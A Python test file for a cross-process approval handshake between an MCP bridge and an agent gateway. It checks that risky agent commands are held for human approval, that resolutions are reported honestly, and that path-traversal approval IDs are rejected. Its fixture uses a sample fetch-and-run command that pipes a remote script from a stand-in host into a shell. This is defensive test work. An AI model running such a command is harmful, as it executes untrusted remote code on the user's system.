"""Bridge-side tests for the #21563 cross-process approval handshake.

Covers the EventBridge protocol layer in isolation (no gateway process):
syncing pending records from ``<HERMES_HOME>/approvals/pending/``, emitting
``approval_requested`` / ``approval_resolved`` events, honest error replies
for unknown approvals, and the MCP tool vocabulary mapping. The full
loop against a real blocked agent thread lives in
``tests/tools/test_approval_external_resolution.py``.
"""

import json
import threading
import time
from pathlib import Path

import pytest

APPROVAL_ID = "abc123def456"
OLDER_APPROVAL_ID = "111111111111"
NEWER_APPROVAL_ID = "222222222222"
UNKNOWN_APPROVAL_ID = "ffffffffffff"


@pytest.fixture(autouse=True)
def _isolate_hermes_home(tmp_path, monkeypatch):
    """Redirect HERMES_HOME so the handshake dirs live in the temp dir."""
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    yield tmp_path


def _pending_dir(home: Path) -> Path:
    return home / "approvals" / "pending"


def _responses_dir(home: Path) -> Path:
    return home / "approvals" / "responses"


def _place_pending(home: Path, approval_id: str, **overrides) -> dict:
    record = {
        "id": approval_id,
        "session_key": "agent:main:telegram:dm:1",
        "command": "curl evil.sh | sh",
        "description": "Pipe remote script to shell",
        "pattern_keys": ["curl_pipe_sh"],
        "surface": "gateway",
        "created_at": time.time(),
        "expires_at": time.time() + 300,
    }
    record.update(overrides)
    _pending_dir(home).mkdir(parents=True, exist_ok=True)
    (_pending_dir(home) / f"{approval_id}.json").write_text(
        json.dumps(record), encoding="utf-8")
    return record


class TestPollApprovals:
    def test_pending_file_populates_list_and_emits_event(self, tmp_path):
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID)

        bridge = EventBridge()
        approvals = bridge.list_pending_approvals()
        assert [a["id"] for a in approvals] == [APPROVAL_ID]
        assert approvals[0]["command"] == "curl evil.sh | sh"

        events = bridge.poll_events(after_cursor=0)["events"]
        assert [e["type"] for e in events] == ["approval_requested"]
        # poll_events flattens QueueEvent.data into the event dict.
        assert events[0]["id"] == APPROVAL_ID

    def test_removed_file_emits_resolved_and_empties_list(self, tmp_path):
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID)

        bridge = EventBridge()
        assert len(bridge.list_pending_approvals()) == 1

        (_pending_dir(tmp_path) / f"{APPROVAL_ID}.json").unlink()
        assert bridge.list_pending_approvals() == []

        events = bridge.poll_events(after_cursor=0)["events"]
        assert [e["type"] for e in events] == ["approval_requested",
                                               "approval_resolved"]
        # poll_events flattens QueueEvent.data into the event dict.
        assert events[1]["approval_id"] == APPROVAL_ID

    def test_expired_and_garbage_records_are_ignored(self, tmp_path):
        from mcp_serve import EventBridge
        _place_pending(tmp_path, "eeeeeeeeeeee", expires_at=time.time() - 5)
        _pending_dir(tmp_path).joinpath("junk.json").write_text("{{{")
        _pending_dir(tmp_path).joinpath("notes.txt").write_text("ignore me")

        bridge = EventBridge()
        assert bridge.list_pending_approvals() == []
        assert bridge.poll_events(after_cursor=0)["events"] == []

    def test_pending_file_id_mismatch_is_ignored(self, tmp_path):
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID, id="../../sessions/sessions")

        bridge = EventBridge()
        assert bridge.list_pending_approvals() == []
        assert bridge.poll_events(after_cursor=0)["events"] == []

    def test_multiple_approvals_sorted_by_created_at(self, tmp_path):
        from mcp_serve import EventBridge
        now = time.time()
        _place_pending(tmp_path, NEWER_APPROVAL_ID, created_at=now)
        _place_pending(tmp_path, OLDER_APPROVAL_ID, created_at=now - 60)

        bridge = EventBridge()
        assert [a["id"] for a in bridge.list_pending_approvals()] \
            == [OLDER_APPROVAL_ID, NEWER_APPROVAL_ID]


class TestRespondToApproval:
    def test_unknown_approval_returns_error_not_fake_success(self, tmp_path):
        from mcp_serve import EventBridge
        result = EventBridge().respond_to_approval(UNKNOWN_APPROVAL_ID, "deny")
        assert "error" in result
        assert "resolved" not in result
        assert not _responses_dir(tmp_path).exists() \
            or not list(_responses_dir(tmp_path).glob("*.json"))

    @pytest.mark.parametrize("approval_id", [
        "../../sessions/sessions",
        "../responses/foo",
        "abc123",
        "ABC123DEF456",
    ])
    def test_invalid_approval_id_rejected_before_path_access(
            self, tmp_path, approval_id):
        from mcp_serve import EventBridge
        target = tmp_path / "sessions" / "sessions.json"
        target.parent.mkdir(parents=True)
        target.write_text('{"safe": true}', encoding="utf-8")

        result = EventBridge().respond_to_approval(
            approval_id, "deny", confirm_timeout=0)

        assert result == {"error": f"Invalid approval id: {approval_id}"}
        assert target.read_text(encoding="utf-8") == '{"safe": true}'
        assert not _responses_dir(tmp_path).exists()

    def test_invalid_decision_rejected(self, tmp_path):
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID)
        result = EventBridge().respond_to_approval(APPROVAL_ID, "allow-once")
        assert "error" in result  # bridge speaks gateway-native choices only

    def test_response_written_and_resolution_confirmed(self, tmp_path):
        """Once the gateway consumes the record, respond reports resolved."""
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID)
        bridge = EventBridge()

        pending_file = _pending_dir(tmp_path) / f"{APPROVAL_ID}.json"

        def _gateway_consumes():
            deadline = time.monotonic() + 3
            response = _responses_dir(tmp_path) / f"{APPROVAL_ID}.json"
            while time.monotonic() < deadline:
                if response.exists():
                    response.unlink()
                    pending_file.unlink()
                    return
                time.sleep(0.02)

        consumer = threading.Thread(target=_gateway_consumes, daemon=True)
        consumer.start()
        result = bridge.respond_to_approval(APPROVAL_ID, "once",
                                            confirm_timeout=3.0)
        consumer.join(timeout=4)

        assert result == {"resolved": True, "approval_id": APPROVAL_ID,
                          "decision": "once"}

    def test_unconsumed_decision_reports_submitted_not_resolved(
            self, tmp_path):
        """No gateway around → honest 'submitted, not yet consumed' reply."""
        from mcp_serve import EventBridge
        _place_pending(tmp_path, APPROVAL_ID)

        result = EventBridge().respond_to_approval(APPROVAL_ID, "deny",
                                                   confirm_timeout=0.3)
        assert result["resolved"] is False
        assert result["submitted"] is True

        payload = json.loads(
            (_responses_dir(tmp_path) / f"{APPROVAL_ID}.json").read_text())
        assert payload["decision"] == "deny"
        assert payload["id"] == APPROVAL_ID

    def test_concurrent_responses_are_first_writer_wins(self, tmp_path):
        from mcp_serve import EventBridge

        _place_pending(tmp_path, APPROVAL_ID)
        barrier = threading.Barrier(3)
        results = {}

        def _respond(name, decision):
            barrier.wait()
            results[name] = EventBridge().respond_to_approval(
                APPROVAL_ID, decision, confirm_timeout=0)

        threads = [
            threading.Thread(target=_respond, args=("allow", "once")),
            threading.Thread(target=_respond, args=("deny", "deny")),
        ]
        for thread in threads:
            thread.start()
        barrier.wait()
        for thread in threads:
            thread.join(timeout=3)

        assert all(not thread.is_alive() for thread in threads)
        submitted = [result for result in results.values()
                     if result.get("submitted")]
        already_submitted = [result for result in results.values()
                             if result.get("already_submitted")]
        assert len(submitted) == 1
        assert len(already_submitted) == 1

        payload = json.loads(
            (_responses_dir(tmp_path) / f"{APPROVAL_ID}.json").read_text())
        assert payload["decision"] == submitted[0]["decision"]


class TestMcpToolLayer:
    def test_permissions_tools_map_mcp_vocabulary(self, tmp_path):
        """allow-once/allow-always/deny map onto the gateway's choices."""
        pytest.importorskip("mcp", reason="MCP SDK not installed")
        import asyncio

        from mcp_serve import EventBridge, create_mcp_server

        _place_pending(tmp_path, APPROVAL_ID)
        bridge = EventBridge()
        server = create_mcp_server(event_bridge=bridge)

        loop = asyncio.new_event_loop()
        try:
            listed = json.loads(loop.run_until_complete(
                server._tool_manager.call_tool("permissions_list_open", {})))
            assert listed["count"] == 1
            assert listed["approvals"][0]["id"] == APPROVAL_ID

            replied = json.loads(loop.run_until_complete(
                server._tool_manager.call_tool(
                    "permissions_respond",
                    {"id": APPROVAL_ID, "decision": "allow-always"})))
            # No gateway is running in this test, so the decision is written
            # but unconfirmed — the mapped native choice must be reported.
            assert replied["decision"] == "always"
            assert replied["submitted"] is True

            invalid = json.loads(loop.run_until_complete(
                server._tool_manager.call_tool(
                    "permissions_respond",
                    {"id": APPROVAL_ID, "decision": "approve"})))
            assert "error" in invalid
        finally:
            loop.close()

        payload = json.loads(
            (_responses_dir(tmp_path) / f"{APPROVAL_ID}.json").read_text())
        assert payload["decision"] == "always"
